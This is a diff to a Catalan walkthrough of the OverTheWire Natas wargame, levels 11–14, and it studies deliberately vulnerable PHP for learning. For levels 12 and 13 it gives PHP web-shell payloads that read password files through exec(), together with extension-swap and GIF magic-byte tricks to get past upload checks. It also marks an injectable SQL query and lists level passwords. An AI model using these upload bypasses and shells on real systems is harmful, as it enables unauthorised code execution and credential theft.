@@ -268,6 +268,7 @@
     Ens dona la password:
     /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 
+
 #  NATAS 11
 
     Username: natas11
@@ -370,6 +371,7 @@
     Posem la Cookie al navegador i cliquem "set color" i obtenim:
     The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 
+
 #  NATAS 12
 
     Username: natas12
@@ -378,35 +380,27 @@
 
 ```
     <?php
-
     function genRandomString() {
         $length = 10;
         $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
         $string = "";
-
         for ($p = 0; $p < $length; $p++) {
             $string .= $characters[mt_rand(0, strlen($characters)-1)];
         }
-
         return $string;
     }
-
     function makeRandomPath($dir, $ext) {
         do {
         $path = $dir."/".genRandomString().".".$ext;
         } while(file_exists($path));
         return $path;
     }
-
     function makeRandomPathFromFilename($dir, $fn) {
         $ext = pathinfo($fn, PATHINFO_EXTENSION);
         return makeRandomPath($dir, $ext);
     }
-
     if(array_key_exists("filename", $_POST)) {
         $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-
-
             if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
             echo "File is too big";
         } else {
@@ -418,7 +412,6 @@
         }
     } else {
     ?>
-
     <form enctype="multipart/form-data" action="index.php" method="POST">
     <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
     <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
@@ -428,23 +421,29 @@
     </form>
     <?php } ?>
 ```
-
-    Veiem que podem penjar altres fitxers que no només siguin JPEG.
+    Aquesta pàgina el que fa bàsicament és que tu pots penjar un fitxer JPEG (max d'1KB) i després pots anar a veure la imatge en qüestió.
+    Primer comprovem si podem penjar altres fitxers que no només siguin format "JPEG".
+    Comprovem que si penjem un fitxer .txt (per exemple), ens el deixa pujar, però no el renderitza (no veiem el contingut).
+    Procedim a crear un fitxer .php on ens mostri la password de l'usuari 13.
+    Tot i així, utilitzarem el mètode "exec" perquè el servidor executi la funció en bash que li passem.
 
     Fitxer .php, amb payload:
     <?php
     echo(exec('cat /etc/natas_webpass/natas13'));
     ?>
 
+    Un cop el fitxer s'ha pujat, inspeccionem el contingut de la nostra pàgina web i veurem una línia com aquesta:
+        <input type="hidden" name="filename" value="s9pspizx1z.jpg">
     Des del navegador modifiquem el nom de .jpg a .php:
-    1. <input type="hidden" name="filename" value="s9pspizx1z.jpg">
-    2. <input type="hidden" name="filename" value="s9pspizx1z.php">
-    Després ens mostra:
-    The file upload/s9pspizx1z.php has been uploaded.
-    Ens hi dirigim i ens mostrara el contingut del fitxer.
+        <input type="hidden" name="filename" value="s9pspizx1z.php">
+    I li donem al botó de 'Upload File', podrem veure:
+        The file upload/s9pspizx1z.php has been uploaded.
+    
+    Ens hi dirigim i ens mostrara el contingut del fitxer, és a dir, la password.
 
     Com que estem executant a través del navegador, realment som l'usuari www-data.
     La vulnerabilitat esta en que aixó és una miss-config ja que aquest usuari no hauria de poder mostrar aquest fitxer.
+    Apart de que no ens hauria de poder deixar pujar fitxers que no siguin JPEG.
 
 
 #  NATAS 13
@@ -454,39 +453,30 @@
     URL:      http://natas13.natas.labs.overthewire.org
 
 
-    <h1>natas13</h1>
     <div id="content">
     For security reasons, we now only accept image files!<br/><br/>
-
     <?php
-
     function genRandomString() {
         $length = 10;
         $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
         $string = "";
-
         for ($p = 0; $p < $length; $p++) {
             $string .= $characters[mt_rand(0, strlen($characters)-1)];
         }
-
         return $string;
     }
-
     function makeRandomPath($dir, $ext) {
         do {
         $path = $dir."/".genRandomString().".".$ext;
         } while(file_exists($path));
         return $path;
     }
-
     function makeRandomPathFromFilename($dir, $fn) {
         $ext = pathinfo($fn, PATHINFO_EXTENSION);
         return makeRandomPath($dir, $ext);
     }
-
     if(array_key_exists("filename", $_POST)) {
         $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-
         $err=$_FILES['uploadedfile']['error'];
         if($err){
             if($err === 2){
@@ -507,21 +497,44 @@
         }
     } else {
     ?>
-
     <form enctype="multipart/form-data" action="index.php" method="POST">
     <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
     <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
 
-    Veiem que és mes o menys igual que l'anterior, però ara comprova si és un fitxer JPEG.
-    Veiem que la funció que ho comprova és "exif_imagetype", per tant, esta utilitzant exif.
-    Exif són les metadades de les imatges.
-    Per tant, provem a canviar l'imagetype perquè ens ho pilli com un fitxer php.
-    Ara tenim que el nostre payload és:
-    GIF8;
-    <?php
-    echo(exec('cat /etc/natas_webpass/natas14'));
-    ?>
 
+    Veiem que és mes o menys igual que l'anterior, però ara comprova si és un fitxer JPEG.
+    Veiem que la funció que ho comprova és "exif_imagetype", per tant, esta utilitzant 'exif'.
+    Exif són les metadades de les imatges.
+
+    Fent una prova amb una imatge (per exemple: exiftool photo.jpeg), veig que ens mostra molts 'fields' útils:
+    "File size, File Type, File Type Extension, MIME Type, etc"
+    Tots els possibles: https://exiftool.org/TagNames/EXIF.html
+
+    Per tant, crec que podem canviar l'imagetype perquè ens ho pilli com un fitxer php i poder executar el nostre codi.
+    Per fer-ho, busco sobre els 'Magic Numbers', que són simplement els primers bytes d'un fitxer per identificar de quin tipus són.
+    
+    Per trobar + info de la imatge:
+        file photo.jpg               
+        photo.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 2392x2500, components 3
+    Per trobar els primers bytes:
+        xxd photo.jpg | head
+        00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
+    Tenim que els fitxers '.jpg', començen amb aquests bytes.
+
+    Provem a fer una prova en local de modificar un fitxer:
+    (creen un fitxer .txt i li apliquem aquest contingut, on podem comprovar que ens detecta com si fos un GIF).
+
+        echo -n -e 'GIF87a' > file.txt
+        file file.txt 
+        file.txt: GIF image data, version 87a,
+
+    
+    Modifiquem el nostre fitxer perquè la web s'ho tragui i ara tenim:
+
+        GIF8;
+        <?php
+        echo(exec('cat /etc/natas_webpass/natas14'));
+        ?>
 
 
 #  NATAS 14
@@ -536,12 +549,10 @@
     if(array_key_exists("username", $_REQUEST)) {
         $link = mysqli_connect('localhost', 'natas14', '<censored>');
         mysqli_select_db($link, 'natas14');
-
         $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
         if(array_key_exists("debug", $_GET)) {
             echo "Executing query: $query<br>";
         }
-
         if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
                 echo "Successful login! The password for natas15 is <censored><br>";
         } else {
@@ -550,13 +561,13 @@
         mysqli_close($link);
     } else {
     ?>
-
     <form action="index.php" method="POST">
     Username: <input name="username"><br>
     Password: <input name="password"><br>
     <input type="submit" value="Login" />
     </form>
     <?php } ?>
+
 
     Veiem que es connecta a una BBDD.
     Tenim la següent sentència on veiem que pot ser injectable.
